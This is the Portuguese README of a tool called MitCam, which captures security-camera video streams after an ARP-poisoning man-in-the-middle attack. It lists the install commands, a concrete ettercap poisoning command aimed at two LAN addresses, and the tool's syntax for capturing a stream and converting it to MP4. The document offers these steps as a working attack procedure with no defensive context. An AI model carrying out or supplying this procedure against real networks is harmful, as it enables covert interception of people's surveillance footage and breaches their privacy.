# MitCam

  Após um ARP poisoning em uma rede com câmeras de segurança, é possível (muitas vezes) capturar o Stream que está sendo transmitido em direção ao DVR ou a própria máquina de monitoramento. Em uma situação onde o Stream é enviado de um DVR, podemos interceptar a comunicação entre o ele e o cliente, identificar as portas de saída de dados, filtrar apenas o necessário e colocar tudo dentro de um arquivo.
  Em geral, os reprodutores de vídeo não reproduzem Stream. Por conta disso, convertemos nosso arquivo para um MP4. 

## Preparação:

Instale as dependências para o ataque:
`apt update`

`apt install ettercap arpspoof wireshark ffmpeg`

`git clone https://github.com/MZTBTG/mitcam.git`

`cd mitcam`

`chmod +x mitcam.sh`

Utilizando uma ferramenta como `ettercap` ou `arpspoof`, realize um ataque MitM entre seus alvos:
`ettercap -TqSM arp /192.168.180.150// /192.168.180.101//`

## Modo de uso:

`./mitcam.sh c [IP] [porta] [NomeArquivoSaida]`
  O comando que se inicia com **c** captura o stream de acordo com os dados que você adicionou na sintaxe.


`./mitcam.sh d [nomeDoArquivoCapturado] [nomeDoArquivoDeSaída] {vlc}`
  O comando que se inicia com **d** converte o arquivo de Stream capturado para mp4. É possível reproduzir automaticamente o vídeo digitando "vlc" no fim do comando
